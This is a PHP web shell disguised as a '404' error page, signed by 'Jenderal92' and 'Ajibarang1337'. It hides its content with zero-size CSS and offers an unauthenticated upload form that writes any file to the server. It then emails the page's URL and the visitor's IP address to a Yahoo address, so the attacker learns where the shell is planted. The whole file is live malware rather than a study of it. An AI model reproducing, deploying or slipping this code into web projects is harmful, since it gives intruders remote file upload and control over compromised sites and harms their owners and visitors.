 <img class=" height="200" src="https://i.ibb.co/64PG4Zp/images.png"/><title>404</title>
<font face="Courier new" color="black" size="6">| _ByME - Jenderal92 - Ajibarang1337 |</font>
<style>body{font-size: 0;}h1{font-size: 12px}</style>
<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>BERHASIL NGNTD:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>GAGAL BNGSD"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=BAKUHANTAMCREW> <br>"; }__halt_compiler();?></h1>
<?php
$tujuanmail = 'Jenderal92@yahoo.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Contact Me", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
